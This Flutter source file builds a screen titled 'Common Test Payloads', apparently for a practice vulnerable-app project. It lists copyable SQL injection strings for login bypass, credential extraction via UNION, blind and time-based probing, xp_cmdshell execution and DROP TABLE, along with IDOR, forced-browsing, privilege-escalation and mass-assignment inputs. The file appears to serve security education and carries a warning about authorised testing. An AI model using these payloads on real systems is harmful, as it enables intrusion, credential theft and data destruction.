import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:test_vuln/theme/cyber_theme.dart';

class PayloadsScreen extends StatelessWidget {
  const PayloadsScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D0D0D),
      extendBodyBehindAppBar: true,
      body: Container(
        height: MediaQuery.of(context).size.height,
        width: MediaQuery.of(context).size.width,
        decoration: BoxDecoration(
          image: DecorationImage(
            image: AssetImage('assets/images/bg1_noLogo.jpg'),
            fit: BoxFit.cover,
          ),
        ),
        child: Container(
          color: Colors.black.withOpacity(0.55),
          child: SafeArea(
            child: SingleChildScrollView(
              physics: const AlwaysScrollableScrollPhysics(),
              padding: const EdgeInsets.all(24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Header
              Row(
                children: [
                  IconButton(
                    icon: const Icon(Icons.arrow_back, color: Colors.white),
                    onPressed: () => Navigator.pop(context),
                  ),
                  const SizedBox(width: 16),
                  Text(
                    'Common Test Payloads',
                    style: GoogleFonts.orbitron(
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        color: Colors.white,
                        letterSpacing: 1.2,
                      ),
                  ),
                ],
              ),
              const SizedBox(height: 24),

              // SQL Injection Section
              Text(
                'SQL Injection (SQLi)',
                style: GoogleFonts.orbitron(
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                  letterSpacing: 1.0,
                ),
              ),
              const SizedBox(height: 8),
              Container(
                height: 2,
                width: 60,
                color: Colors.white38,
              ),
              const SizedBox(height: 20),

              // Authentication Bypass / Tautology
              _buildSectionTitle('Authentication Bypass / Tautology'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['\' OR \'1\'=\'1', 'Classic tautology – bypasses login'],
                  ['\' OR 1=1--', 'Numeric version with comment'],
                  ['\' OR \'1\'=\'1\' /*', 'MySQL inline comment variant'],
                  ['admin\'--', 'Comment out the rest of the query'],
                  ['admin\' #', 'MySQL hash‑style comment'],
                  ['\' OR 1=1#', 'Numeric tautology with hash'],
                ],
              ),
              const SizedBox(height: 24),

              // UNION-Based Extraction
              _buildSectionTitle('UNION‑Based Extraction'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['\' UNION SELECT null--', 'Determine column count (add more nulls)'],
                  ['\' UNION SELECT null, null--', 'Two columns'],
                  ['\' UNION SELECT username, password FROM users--', 'Extract credentials'],
                  ['\' UNION SELECT database(), user()--', 'Get database name and current user'],
                  ['\' UNION SELECT table_name, null FROM information_schema.tables--', 'List tables'],
                ],
              ),
              const SizedBox(height: 24),

              // Blind SQL Injection
              _buildSectionTitle('Blind SQL Injection'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['\' AND 1=1--', 'True condition – page loads normally'],
                  ['\' AND 1=2--', 'False condition – page loads differently'],
                  ['\' AND SLEEP(5)--', 'Time‑based blind injection'],
                  ['\' AND (SELECT COUNT(*) FROM users) > 0--', 'Boolean‑based blind injection'],
                ],
              ),
              const SizedBox(height: 24),

              // Error-Based Injection
              _buildSectionTitle('Error‑Based Injection'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['\' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--', 'SQL Server error‑based'],
                  ['\' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--', 'MySQL error‑based'],
                  ['\' OR 1=1; EXEC xp_cmdshell(\'dir\')--', 'Command execution via error'],
                ],
              ),
              const SizedBox(height: 24),

              // Time-Based Blind
              _buildSectionTitle('Time‑Based Blind'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['\' OR SLEEP(5)--', 'MySQL time‑based blind'],
                  ['\' WAITFOR DELAY \'0:0:5\'--', 'MSSQL time‑based blind'],
                  ['\' AND pg_sleep(5)--', 'PostgreSQL time‑based blind'],
                ],
              ),
              const SizedBox(height: 24),

              // Second-Order
              _buildSectionTitle('Second‑Order (Stored)'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload', 'Description'],
                rows: [
                  ['admin\'; UPDATE users SET role=\'admin\' WHERE username=\'user\'; --', 'Stored in profile, triggers later'],
                  ['\'; DROP TABLE logs; --', 'Dangerous, only for isolated labs'],
                ],
              ),
              const SizedBox(height: 32),

              // Divider
              Container(
                height: 1,
                color: Colors.white38.withOpacity(0.3),
              ),
              const SizedBox(height: 32),

              // Broken Access Control Section
              Text(
                'Broken Access Control',
                style: GoogleFonts.orbitron(
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                  letterSpacing: 1.0,
                ),
              ),
              const SizedBox(height: 8),
              Container(
                height: 2,
                width: 60,
                color: Colors.white38,
              ),
              const SizedBox(height: 20),

              // IDOR
              _buildSectionTitle('IDOR (Insecure Direct Object Reference)'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload / Input', 'Description'],
                rows: [
                  ['?order_id=1002', 'View another user\'s order'],
                  ['?user_id=2', 'Access another user\'s profile'],
                  ['?product_id=9999', 'View another user\'s product'],
                  ['/api/orders/1002', 'API endpoint IDOR'],
                  ['/user/profile/2', 'Path‑based IDOR'],
                  ['?file_id=13', 'Access another user\'s file'],
                ],
              ),
              const SizedBox(height: 24),

              // Forced Browsing
              _buildSectionTitle('Forced Browsing (Direct Path Access)'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload / Input', 'Description'],
                rows: [
                  ['/admin', 'Access admin panel without auth'],
                  ['/admin/users', 'View all users (if unprotected)'],
                  ['/backup/db.sql', 'Download backup file'],
                  ['/config.php', 'Retrieve configuration'],
                  ['../admin', 'Path traversal to admin'],
                  ['/.git/config', 'Expose Git configuration'],
                ],
              ),
              const SizedBox(height: 24),

              // Privilege Escalation
              _buildSectionTitle('Privilege Escalation (Parameter Tampering)'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload / Input', 'Description'],
                rows: [
                  ['role=admin', 'Add role parameter to become admin'],
                  ['is_admin=true', 'Mass assignment, set admin flag'],
                  ['&isAdmin=1', 'URL parameter escalation'],
                  ['&permission=all', 'Grant all permissions'],
                  ['&group=administrators', 'Add to admin group'],
                ],
              ),
              const SizedBox(height: 24),

              // Mass Assignment
              _buildSectionTitle('Mass Assignment (Over‑posting / JSON)'),
              const SizedBox(height: 12),
              _buildPayloadTable(
                context: context,
                headers: ['Payload / Input', 'Description'],
                rows: [
                  ['{"role":"admin"}', 'JSON mass assignment'],
                  ['{"id":1, "role":"admin"}', 'Over‑post extra fields'],
                  ['&role=admin', 'Append to POST data'],
                  ['user[role]=admin', 'Nested parameter mass assignment'],
                ],
              ),
              const SizedBox(height: 16),

              // Warning note
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(
                    color: Colors.white38.withOpacity(0.3),
                  ),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.warning_amber_rounded, color: Colors.orange, size: 20),
                    SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        '⚠️ These payloads are for educational purposes only. Only test on systems you own or have written permission to test.',
                        style: TextStyle(
                          fontSize: 11,
                          color: Colors.white70,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
          ),
        ),
      ),
    );
  }

  Widget _buildSectionTitle(String title) {
    return Text(
      title,
      style: GoogleFonts.orbitron(
        fontSize: 14,
        fontWeight: FontWeight.w600,
        color: Colors.white,
        letterSpacing: 0.8,
      ),
    );
  }

  Widget _buildPayloadTable({
    required BuildContext context,
    required List<String> headers,
    required List<List<String>> rows,
  }) {
    return Container(
      decoration: BoxDecoration(
        border: Border.all(
          color: Colors.white38.withOpacity(0.3),
        ),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        children: [
          // Header
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.1),
              borderRadius: const BorderRadius.only(
                topLeft: Radius.circular(8),
                topRight: Radius.circular(8),
              ),
            ),
            child: Row(
              children: headers.map((header) {
                int flex = header == 'Payload' || header == 'Payload / Input' ? 3 : 2;
                return Expanded(
                  flex: flex,
                  child: Text(
                    header,
                    style: const TextStyle(
                      fontWeight: FontWeight.bold,
                      color: Colors.white,
                      fontSize: 12,
                    ),
                  ),
                );
              }).toList(),
            ),
          ),
          // Rows
          ...rows.asMap().entries.map((entry) {
            int index = entry.key;
            List<String> row = entry.value;
            return Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
              decoration: BoxDecoration(
                border: Border(
                  top: BorderSide(
                    color: Colors.white38.withOpacity(0.15),
                  ),
                ),
                color: index.isEven
                    ? Colors.transparent
                    : Colors.white.withOpacity(0.02),
              ),
              child: Row(
                children: [
                  Expanded(
                    flex: 3,
                    child: SelectableText(
                      row[0],
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 11,
                        fontFamily: 'monospace',
                      ),
                    ),
                  ),
                  Expanded(
                    flex: 2,
                    child: Text(
                      row[1],
                      style: const TextStyle(
                        color: Colors.white70,
                        fontSize: 11,
                      ),
                    ),
                  ),
                  const SizedBox(width: 8),
                  GestureDetector(
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: row[0]));
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Row(
                            children: [
                              const Icon(Icons.check_circle, color: Colors.white, size: 16),
                              const SizedBox(width: 8),
                              Text('Copied: ${row[0].substring(0, row[0].length > 30 ? 30 : row[0].length)}${row[0].length > 30 ? '...' : ''}'),
                            ],
                          ),
                          backgroundColor: Colors.white38,
                          duration: const Duration(seconds: 2),
                          behavior: SnackBarBehavior.floating,
                        ),
                      );
                    },
                    child: Container(
                      padding: const EdgeInsets.all(6),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(
                          color: Colors.white38,
                          width: 1,
                        ),
                      ),
                      child: const Icon(
                        Icons.content_copy,
                        color: Colors.white,
                        size: 16,
                      ),
                    ),
                  ),
                ],
              ),
            );
          }).toList(),
        ],
      ),
    );
  }
}